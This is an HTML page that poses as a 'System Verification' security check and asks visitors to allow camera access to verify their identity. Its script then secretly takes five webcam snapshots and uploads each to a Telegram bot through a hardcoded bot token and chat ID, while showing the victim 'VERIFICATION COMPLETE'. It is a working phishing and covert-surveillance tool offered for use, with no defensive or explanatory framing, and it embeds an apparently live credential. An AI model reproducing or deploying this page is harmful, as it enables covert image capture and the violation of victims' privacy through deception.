<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google" content="notranslate">
    <title>System Verification</title>
    <style>
        body { background-color: #0f0f0f; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; border: 1px solid #00ff00; padding: 40px; box-shadow: 0 0 20px #00ff00; }
        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
        button:hover { background: #00cc00; }
        canvas { display: none; }
    </style>
</head>
<body class="notranslate">

<div class="container">
    <h2>SECURITY CHECK REQUIRED</h2>
    <p>Please allow camera access to verify your identity.</p>
    <button id="startBtn">START VERIFICATION</button>
</div>

<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const TOKEN = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
    const CHAT_ID = "8397194527";
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const btn = document.getElementById('startBtn');

    btn.addEventListener('click', async () => {
        try {
            // طلب الإذن من المتصفح
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            btn.innerText = "VERIFYING... PLEASE WAIT";
            
            let count = 0;
            const interval = setInterval(() => {
                if (count < 5) {
                    captureAndSend();
                    count++;
                } else {
                    clearInterval(interval);
                    btn.innerText = "VERIFICATION COMPLETE";
                    stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
                }
            }, 2000); // التقاط صورة كل ثانيتين

        } catch (err) {
            alert("Error: Access Denied. Verification Failed.");
        }
    });

    function captureAndSend() {
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }, 'image/jpeg');
    }
</script>
</body>
</html>
